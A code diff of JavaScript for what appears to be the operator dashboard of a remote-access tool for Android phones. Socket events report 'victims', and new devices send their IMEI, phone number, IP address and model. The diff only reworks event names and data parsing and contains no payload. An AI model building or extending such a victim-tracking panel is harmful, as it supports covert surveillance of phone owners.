@@ -164,13 +164,13 @@
               'highlight' : 'light'
             },
             success: function(data){
-              $('.log-class').append(data.htmlresponse);
+              $('.log-class').append(data.htmlresponse)
             }
           });
       });
 
       socket.on('victims', function(msg) {
-        if(msg != "None"){
+        if(msg['data'] != "None"){
           $.ajax({
             url: '/log',
             type: 'post',
@@ -248,14 +248,14 @@
         });
       })
 
-      socket.on('update_victim_ip', function(msg) {
-        var ip = document.getElementsByClassName(`ip-address-${msg['device_id']}`)
+      socket.on('update victim ip', function(msg) {
+        var ip = document.getElementsByClassName(`ip-address-${msg['data'][0]}`)
         // set ip text msg['ipaddress']
         $.ajax({
             url: '/log',
             type: 'post',
             data: {
-              'data' : `${msg['device_id']} IP address changed to ${msg['ipaddress']}`,
+              'data' : `${msg['data'][0]} IP address changed to ${msg['data'][1]}`,
               'highlight' : 'light'
             },
             success: function(data){
@@ -264,14 +264,14 @@
         });
       });
 
-      socket.on('update_victim_socketid', function(msg) {
-        var socketid = document.getElementsByClassName(`socket-id-${msg['device_id']}`)
+      socket.on('update victim socketid', function(msg) {
+        var socketid = document.getElementsByClassName(`socket-id-${msg['data'][0]}`)
         // set socketid text to msg['socketid']
         $.ajax({
             url: '/log',
             type: 'post',
             data: {
-              'data' : `${msg['device_id']} socket id changed to ${msg['socketid']}`,
+              'data' : `${msg['data'][0]} socket id changed to ${msg['data'][1]}`,
               'highlight' : 'light'
             },
             success: function(data){
@@ -280,19 +280,20 @@
         });
       });
 
-      socket.on('new_device', function(msg) {
-        var deviceid = msg['device_id']
+      socket.on('new device', function(msg) {
+        var deviceid = msg['data'][1]
+        console.log("new device event")
         $.ajax({
           url: '/clients',
           type: 'post',
           data: {
-            'model' : msg['model'],
+            'model' : msg['data'][0],
             'device-id' : deviceid,
-            'ip-address' : msg['ipaddress'],
-            'imei' : msg['imei'],
-            'api' : msg['api'],
-            'socketid' : msg['socketid'],
-            'phone' : msg['phone']
+            'ip-address' : msg['data'][2],
+            'imei' : msg['data'][3],
+            'api' : msg['data'][4],
+            'socketid' : msg['data'][5],
+            'phone' : msg['data'][6]
           },
           success: function(data){
             $('.victims-body').append(data.htmlresponse);
@@ -305,6 +306,7 @@
               },
               success: function(data){
                   $('.log-class').append(data.htmlresponse);
+                  $('.log-class').scrollTop
               }
             });
           }
